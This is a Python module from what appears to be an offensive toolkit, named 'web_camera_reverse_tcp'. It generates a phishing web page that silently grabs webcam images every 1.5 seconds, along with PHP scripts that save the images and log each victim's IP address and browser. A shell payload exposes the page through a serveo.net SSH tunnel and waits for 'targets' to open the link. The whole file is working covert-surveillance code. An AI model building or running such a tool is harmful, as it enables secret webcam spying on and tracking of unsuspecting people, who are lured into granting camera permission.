import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "web_camera_reverse_tcp",
        "title"       : "Tking pictures",
        "module"      : "payloads/web/camera/reverse_tcp android windows linux browser chrome firefox opera",
        "description" : "Use browser and take pictures"
}

options ={
  "LPORT" : [str(var.lport[0]),'The listen port']
}

def running():
        try:
                        print ("")
                        print (blue+"[*]"+default+ "Create a backdour")
                        time.sleep(2)
                        print ("")
                        time.sleep(2)
                        print ("")
                        mark = '"'
                        indexphp='''
<?php
include 'ip.php';
header('Location: /index2.html');
exit
?>
'''
                        indexhtml='''
<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {

    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);


}

// Load init
init();

</script>

    <body>
        <p>Hint: Look at the favicon</p>
        <p>(Accept Permissions)</p>
        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
    </body>

</html>
'''
                        index2html='''
<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {

    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);


}

// Load init
init();

</script>

    <body>
        <p>Hint: Look at the favicon</p>
        <p>(Accept Permissions)</p>
        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
    </body>

</html>
'''
                        ipphp='''
<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);
'''
                        postphp='''
<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>
'''
                        templatephp='''
<?php
include 'ip.php';
header('Location: forwarding_link/index2.html');
exit
?>
'''
                        a = open("index.php" , 'w')
                        a.write(indexphp)
                        a.close()
                        b = open("index.html" , 'w')
                        b.write(indexhtml)
                        b.close()
                        c = open("index2.html" , 'w')
                        c.write(index2html)
                        c.close()
                        d = open("ip.php" , 'w')
                        d.write(ipphp)
                        d.close()
                        e = open("post.php" , 'w')
                        e.write(postphp)
                        e.close()
                        f = open("template.php" , 'w')
                        f.write(templatephp)
                        f.close()
                        g = open("saved.ip.txt" , 'w')
                        g.write(" ")
                        g.close()
                        payload = '''
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\\n" $ip
cat core/lib/payloads/camera_web_reverse_tcp/ip.txt >> core/lib/payloads/camera_web_reverse_tcp/saved.ip.txt
}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}
checkfound() {
printf "\\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "\\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\\n"
rm -rf Log.log
fi
sleep 0.5
done
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index2.html > index.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\\n"
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R whoami:80:localhost:''' +var.lport[0]+ ''' serveo.net  2> /dev/null > sendlink '
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:''' +var.lport[0]+ ''' serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:'''+lport[0]+''' )\e[0m\n"
fuser -k '''+var.lport[0]+'''/tcp > /dev/null 2>&1
php -S localhost:'''+var.lport[0]+''' > /dev/null 2>&1 &
}
start() {
server
payload
checkfound
}
start
'''
                        os.system(payload+"rm -rf index.php index.html index2.html ip.php post.php template.php saved.ip.txt")

        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
